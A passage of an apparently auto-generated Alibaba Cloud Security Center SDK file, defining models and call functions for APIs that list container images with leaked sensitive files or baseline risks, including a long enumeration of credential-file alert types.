*   **joomla_cfg**: Joomla configuration.
*   **hashicorp_terraform_token**: HashiCorp Terraform token.
*   **jetbrains_ides**: JetBrains IDEs configuration.
*   **heroku_api_key**: API key for Heroku.
*   **messagebird_token**: MessageBird token.
*   **github_app_token**: Github app token.
*   **hashicorp_vault_token**: HashiCorp Vault token.
*   **pgp_private_key**: PGP private key.
*   **sshpasswd**: SSH password.
*   **huaweicloud_ak**: secret access key of a third-party cloud.
*   **aws_s3cmd**: AWS S3cmd configuration.
*   **php_config**: PHP configuration.
*   **common_private_key**: common private key.
*   **microsoft_mdf**: Microsoft SQL Server database.
*   **mediawiki_cfg**: MediaWiki configuration.
*   **jenkins_cred**: Jenkins credential.
*   **rubygems_cred**: RubyGems credential.
*   **clojars_token**: Clojars token.
*   **phoenix_web_passwd**: Phoenix web credential.
*   **puttygen_private_key**: PuTTYgen private key.
*   **google_oauth_token**: Google OAuth access token.
*   **rubyonrails_cfg**: Ruby On Rails database configuration.
*   **lob_api_key**: Lob API key for Lob.
*   **pkcs_cred**: PKCS#12 certificate.
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key.
*   **contentful_delivery_token**: Contentful delivery token.
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration.
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key.
*   **rails_app_token**: app token for Rails.
*   **git_cred**: user credential for Git.
*   **newrelic_api_key**: User API key for New Relic.
*   **github_hub**: hub configuration for storing GitHub tokens.
*   **rubygem**: RubyGem token.', example='sshpasswd'),
  status?: string(name='Status', description='The sensitive file status. Valid values:

*   **0**: unhandled
*   **1**: ignored
*   **2**: false positive', example='0'),
}

model DescribeImageListBySensitiveFileShrinkRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  imageDigest?: string(name='ImageDigest', description='The image digest.
> Fuzzy match is supported.', example='v005'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the specified container image.

> You can call the [ListRepository](https://help.aliyun.com/document_detail/451339.html) operation to obtain the IDs of container images from the value of the **InstanceId** response parameter.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

> Fuzzy match is supported.', example='harbor-image-v001'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.
> Fuzzy match is supported.', example='libssh2'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the file. Separate multiple levels with commas (,). Valid values:

- **high**
- **medium**
- **low**', example='high'),
  scanRangeShrink?: string(name='ScanRange', description='An array consisting of the types of the assets that you want to scan. Valid values:
- **image**
- **container**'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The type of the alert for the sensitive file. Valid values:

*   **npm_token**: npm access token.
*   **ftp_cfg**: FTP configuration.
*   **google_oauth_key**: Google OAuth key.
*   **planetscale_passwd**: PlanetScale password.
*   **github_ssh_key**: Github SSH key.
*   **msbuild_publish_profile**: MSBuild publish profile.
*   **fastly_cdn_token**: Fastly CDN token.
*   **ssh_private_key**: SSH private key.
*   **aws_cli**: Amazon Web Services (AWS) CLI credential.
*   **cpanel_proftpd**: cPanel ProFTPD credential.
*   **postgresql_passwd**: PostgreSQL password file.
*   **discord_client_cred**: Discord client credential.
*   **rails_database**: Rails database configuration.
*   **aws_access_key**: AWS access key.
*   **esmtp_cfg**: configuration of mail server over Extended Simple Mail Transfer Protocol (ESMTP).
*   **docker_registry_cfg**: configuration of a Docker image repository.
*   **pem**: Privacy-Enhanced Mail (PEM).
*   **common_cred**: common credential.
*   **sftp_cfg**: configuration of connection over Secure File Transfer Protocol (SFTP).
*   **grafana_token**: Grafana token.
*   **slack_token**: Slack token.
*   **ec_private_key**: Elliptic Curve (EC) private key.
*   **pypi_token**: Python Package Index (PyPI) token.
*   **finicity_token**: Finicity token.
*   **k8s_client_key**: private key for the Kubernetes client.
*   **git_cfg**: Git configuration.
*   **django_key**: Django key.
*   **jenkins_ssh**: SSH configuration file for Jenkins.
*   **openssh_private_key**: OpenSSH private key.
*   **square_oauth**: Square OAuth credential.
*   **typeform_token**: Typeform token.
*   **common_database_cfg**: configuration of general database connection.
*   **wordpress_database_cfg**: WordPress database configuration.
*   **googlecloud_api_key**: API key for Google Cloud.
*   **vscode_sftp**: VSCode SFTP configuration.
*   **apache_htpasswd**: Apache htpasswd.
*   **planetscale_token**: PlanetScale token.
*   **contentful_preview_token**: preview token for Contentful.
*   **php_database_cfg**: database password for a PHP application.
*   **atom_remote_sync**: Atom remote synchronization configuration.
*   **aws_session_token**: AWS session token.
*   **atom_sftp_cfg**: Atom SFTP configuration.
*   **asana_client_private_key**: private key for the Asana client.
*   **tencentcloud_ak**: secret ID of a third-party cloud.
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key.
*   **github_personal_token**: personal access token for GitHub.
*   **pgp**: Pretty Good Privacy (PGP) encrypted file.
*   **stripe_skpk**: Stripe secret key.
*   **square_token**: Square access token.
*   **rails_carrierwave**: Rails Carrierwave credential.
*   **dbeaver_database_cfg**: DBeaver database configuration.
*   **robomongo_cred**: RoboMongo credential.
*   **github_oauth_token**: OAuth access token for GitHub.
*   **pulumi_token**: Pulumi token.
*   **ventrilo_voip**: configuration of a Ventrilo VoIP server.
*   **macos_keychain**: macOS keychain.
*   **amazon_mws_token**: Amazon MWS token.
*   **dynatrace_token**: Dynatrace token.
*   **java_keystore**: Java KeyStore (JKS).
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database.
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard.
*   **atlassian_token**: Atlassian token.
*   **rdp**: remote desktop protocol (RDP).
*   **mailgun_key**: Mailgun webhook signing key.
*   **mailchimp_api_key**: API key for Mailchimp.
*   **netrc_cfg**: .netrc configuration file.
*   **openvpn_cfg**: configuration of the OpenVPN client.
*   **github_refresh_token**: GitHub refresh token.
*   **salesforce**: Salesforce credential.
*   **salesforce**: Sendinblue token.
*   **pkcs_private_key**: PKCS#12 private key.
*   **rubyonrails_passwd**: Ruby on Rails password file.
*   **filezilla_ftp**: FileZilla FTP configuration.
*   **databricks_token**: Databricks token.
*   **gitLab_personal_toke**: personal access token for GitLab.
*   **rails_master_key**: Rails master key.
*   **sqlite**: SQLite3 or SQLite database.
*   **firefox_logins**: Firefox logon configuration.
*   **mailgun_private_token**: Mailgun private token.
*   **joomla_cfg**: Joomla configuration.
*   **hashicorp_terraform_token**: HashiCorp Terraform token.
*   **jetbrains_ides**: JetBrains IDEs configuration.
*   **heroku_api_key**: API key for Heroku.
*   **messagebird_token**: MessageBird token.
*   **github_app_token**: Github app token.
*   **hashicorp_vault_token**: HashiCorp Vault token.
*   **pgp_private_key**: PGP private key.
*   **sshpasswd**: SSH password.
*   **huaweicloud_ak**: secret access key of a third-party cloud.
*   **aws_s3cmd**: AWS S3cmd configuration.
*   **php_config**: PHP configuration.
*   **common_private_key**: common private key.
*   **microsoft_mdf**: Microsoft SQL Server database.
*   **mediawiki_cfg**: MediaWiki configuration.
*   **jenkins_cred**: Jenkins credential.
*   **rubygems_cred**: RubyGems credential.
*   **clojars_token**: Clojars token.
*   **phoenix_web_passwd**: Phoenix web credential.
*   **puttygen_private_key**: PuTTYgen private key.
*   **google_oauth_token**: Google OAuth access token.
*   **rubyonrails_cfg**: Ruby On Rails database configuration.
*   **lob_api_key**: Lob API key for Lob.
*   **pkcs_cred**: PKCS#12 certificate.
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key.
*   **contentful_delivery_token**: Contentful delivery token.
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration.
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key.
*   **rails_app_token**: app token for Rails.
*   **git_cred**: user credential for Git.
*   **newrelic_api_key**: User API key for New Relic.
*   **github_hub**: hub configuration for storing GitHub tokens.
*   **rubygem**: RubyGem token.', example='sshpasswd'),
  status?: string(name='Status', description='The sensitive file status. Valid values:

*   **0**: unhandled
*   **1**: ignored
*   **2**: false positive', example='0'),
}

model DescribeImageListBySensitiveFileResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  imageInfos?: [ 
    {
      digest?: string(name='Digest', description='The image digest.', example='v005'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1649814050000'),
      instanceId?: string(name='InstanceId', description='The image instance ID.', example='cri-a595qp31knh9****'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1649814050000'),
      regionId?: string(name='RegionId', description='The ID of the region in which the image instance resides.', example='cn-hangzhou'),
      repoName?: string(name='RepoName', description='The image repository name.', example='opa-test'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
      status?: string(name='Status', description='The sensitive file status. Valid values:

*   **0**: unhandled
*   **1**: ignored
*   **2**: false positive', example='0'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='nuxeo6'),
      uuid?: string(name='Uuid', description='The image UUID.', example='f58681174f944623345379e23b7b****'),
    }
  ](name='ImageInfos', description='The information about the images.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='83'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E0C5C07F-1576-509A-AE44-1C36B8445B37'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:
- **true**: The request was successful.
- **false**: The request failed.', example='true'),
}

model DescribeImageListBySensitiveFileResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageListBySensitiveFileResponseBody(name='body'),
}

/**
 * @summary Queries information about images that are affected by sensitive files.
 *
 * @param tmpReq DescribeImageListBySensitiveFileRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageListBySensitiveFileResponse
 */
async function describeImageListBySensitiveFileWithOptions(tmpReq: DescribeImageListBySensitiveFileRequest, runtime: Util.RuntimeOptions): DescribeImageListBySensitiveFileResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageListBySensitiveFileShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListBySensitiveFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about images that are affected by sensitive files.
 *
 * @param request DescribeImageListBySensitiveFileRequest
 * @return DescribeImageListBySensitiveFileResponse
 */
async function describeImageListBySensitiveFile(request: DescribeImageListBySensitiveFileRequest): DescribeImageListBySensitiveFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListBySensitiveFileWithOptions(request, runtime);
}

model DescribeImageListWithBaselineNameRequest {
  baselineNameKey?: string(name='BaselineNameKey', description='The name of the image baseline.

This parameter is required.', example='ak_leak'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='c08d5fc1a329a4b88950a253d082f****'),
  criteria?: string(name='Criteria', description='The search condition for the image baseline.', example='Unauthorized access'),
  criteriaType?: string(name='CriteriaType', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='BaselineNameAlias'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  image?: string(name='Image', description='The name of the image to which the container belongs.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  imageDigest?: string(name='ImageDigest', description='The SHA-256 value of the image digest.', example='2e6daffce524ffeae66cccaa90c8fc47de912346dcec295c27395b6d66db6423'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeImageListWithBaselineNameResponseBody = {
  imageInfos?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The SHA-256 value of the image digest.', example='2e6daffce524ffeae66cccaa90c8fc47de912346dcec295c27395b6d66db6423'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp generated when the first scan was performed. Unit: milliseconds.', example='1649814050000'),
      highRiskImage?: int32(name='HighRiskImage', description='The number of images on which **high** baseline risks are detected.', example='1'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageCreate?: long(name='ImageCreate', description='The timestamp when the image was created. Unit: milliseconds.', example='1636962328000'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='cddb5fd33b34a1fabb358d0a19497cdfe362fe624821cb250947af0ea5cc****'),
      imageSize?: int32(name='ImageSize', description='The size of the image.', example='157408623'),
      imageUpdate?: long(name='ImageUpdate', description='The timestamp when the image was updated. Unit: milliseconds.', example='1636974116000'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='cri-a595qp31knh9****'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='pre.mongo-196'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.96.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.16.XX.XX'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last baseline check was performed. Unit: milliseconds.', example='1649814050000'),
      lowRiskImage?: int32(name='LowRiskImage', description='The number of images on which **low** baseline risks are detected.', example='0'),
      middleRiskImage?: int32(name='MiddleRiskImage', description='The number of images on which **medium** baseline risks are detected.', example='0'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      noRiskImage?: int32(name='NoRiskImage', description='The number of images that do not have baseline risks.', example='0'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      regionId?: string(name='RegionId', description='The region ID of the image instance.', example='cn-beijing'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-1lt6q7167yh6****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='scanner'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      repoType?: string(name='RepoType', description='The type of the image repository.', example='PRIVATE'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether the image is at risk. Valid values:

*   **YES**
*   **NO**', example='YES'),
      tag?: string(name='Tag', description='The version of the image.', example='v1'),
      targetId?: string(name='TargetId', description='The ID of the asset on which the baseline check is performed.', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', description='The name of the asset on which the baseline check is performed.', example='spod'),
      targetType?: string(name='TargetType', description='The type of the asset on which the baseline check is performed. Valid values:

*   ECS_IMAGE
*   ECS_SNAPSHOT', example='ECS_IMAGE'),
      totalItemCount?: int32(name='TotalItemCount', description='The total number of risk items that are detected on the image by using the baseline.', example='3'),
      uuid?: string(name='Uuid', description='The UUID of the image.', example='f58681174f944623345379e23b7b****'),
    }
  ](name='ImageInfos', description='The information about the images.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of the images returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of images on which baseline risks are detected.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5B8C2156-2DB9-5A42-99E7-F2ED5AE9EA1F'),
}

model DescribeImageListWithBaselineNameResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageListWithBaselineNameResponseBody(name='body'),
}

/**
 * @summary Queries the details about images in the results of image baseline checks.
 *
 * @param request DescribeImageListWithBaselineNameRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageListWithBaselineNameResponse
 */
async function describeImageListWithBaselineNameWithOptions(request: DescribeImageListWithBaselineNameRequest, runtime: Util.RuntimeOptions): DescribeImageListWithBaselineNameResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineNameKey)) {
    query['BaselineNameKey'] = request.baselineNameKey;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListWithBaselineName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about images in the results of image baseline checks.
 *
 * @param request DescribeImageListWithBaselineNameRequest
 * @return DescribeImageListWithBaselineNameResponse
 */
async function describeImageListWithBaselineName(request: DescribeImageListWithBaselineNameRequest): DescribeImageListWithBaselineNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListWithBaselineNameWithOptions(request, runtime);
}

model DescribeImageRepoCriteriaRequest {
  value?: string(name='Value', description='The value of the filter condition.

> You can perform fuzzy search based on the image ID, image tag, image instance ID, image repository name, image repository namespace, image repository ID, image repository region, image digest, and image repository type.', example='2.0.2'),
}

model DescribeImageRepoCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition. Valid values:

*   **instanceId**: the ID of the image instance.
*   **repoName**: the name of the image repository.
*   **repoId**: the ID of the image repository.
*   **repoNamespace**: the namespace of the image repository.
*   **regionId**: the region in which the image resides.
*   **vulStatus**: indicates whether vulnerabilities exist.
*   **alarmStatus**: indicates whether security alerts exist.
*   **hcStatus**: indicates whether baseline risks exist.
*   **riskStatus**: indicates whether risks exist.
*   **registryType**: the type of the image repository.
*   **ImageId**: the image ID.
*   **tag**: the image tag.', example='vulStatus'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: The search condition needs to be specified.
*   **select**: The search condition is an option that can be selected from the drop-down list.', example='select'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is set to **select**.

> If the value of **Type** is set to **input**, the return value of this parameter is empty.', example='NO,YES'),
    }
  ](name='CriteriaList', description='An array consisting of the filter conditions that are supported by the image repository.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model DescribeImageRepoCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageRepoCriteriaResponseBody(name='body'),
}

/**
 * @summary Obtains the filter conditions that are supported by the image repository.
 *
 * @param request DescribeImageRepoCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageRepoCriteriaResponse
 */
async function describeImageRepoCriteriaWithOptions(request: DescribeImageRepoCriteriaRequest, runtime: Util.RuntimeOptions): DescribeImageRepoCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the filter conditions that are supported by the image repository.
 *
 * @param request DescribeImageRepoCriteriaRequest
 * @return DescribeImageRepoCriteriaResponse
 */
async function describeImageRepoCriteria(request: DescribeImageRepoCriteriaRequest): DescribeImageRepoCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoCriteriaWithOptions(request, runtime);
}

model DescribeImageRepoDetailListRequest {
  criteria?: string(name='Criteria', description='The search conditions for assets. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the search condition.

*   **name**: the value of the search condition.

*   **logicalExp**: the logical relation for multiple search conditions. Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.

> You can call the [DescribeImageRepoCriteria](~~DescribeImageRepoCriteria~~) operation to query the supported search conditions.', example='[{"name":"vulStatus","value":"YES","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: Search conditions are evaluated by using a logical **OR**.
*   **AND**: Search conditions are evaluated by using a logical **AND**.', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
}

model DescribeImageRepoDetailListResponseBody = {
  imageRepoResponses?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated for the image repository.', example='0'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the image repository. Valid values:

*   **YES**
*   **NO**', example='NO'),
      endpoints?: string(name='Endpoints', description='The address of the image repository.', example='[
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "internet"
      },
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "intranet"
      },
      {
            "domains": [
                  "****.cn-shenzhen.cr.aliyuncs.com"
            ],
            "type": "vpc"
      }
]'),
      hasRiskImageCount?: int32(name='HasRiskImageCount', description='The number of the images on which risks are detected.', example='2'),
      hcCount?: int32(name='HcCount', description='The number of baseline risk items on the image repository.', example='0'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risk items are detected on the image repository. Valid values:

*   **NO**
*   **YES**', example='NO'),
      imageCount?: int32(name='ImageCount', description='The number of images.', example='3'),
      instanceId?: string(name='InstanceId', description='The ID of the image.', example='i-uf6fsg6xlmorug5****'),
      regionId?: string(name='RegionId', description='The region ID of the image.', example='cn-shanghai'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**', example='acr'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-2chlzf47w2rk****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='zeus'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='test-dev'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether the image repository is at risk. Valid values:

*   **YES**
*   **NO**', example='NO'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities detected on the image repository.', example='0'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected on the image repository. Valid values:

*   **YES**
*   **NO**', example='NO'),
    }
  ](name='ImageRepoResponses', description='The information about image repositories.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of image repositories.', example='19'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model DescribeImageRepoDetailListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeImageRepoDetailListResponseBody(name='body'),
}

/**
 * @summary Queries the information about image repositories.
 *
 * @param request DescribeImageRepoDetailListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeImageRepoDetailListResponse
 */
async function describeImageRepoDetailListWithOptions(request: DescribeImageRepoDetailListRequest, runtime: Util.RuntimeOptions): DescribeImageRepoDetailListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoDetailList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
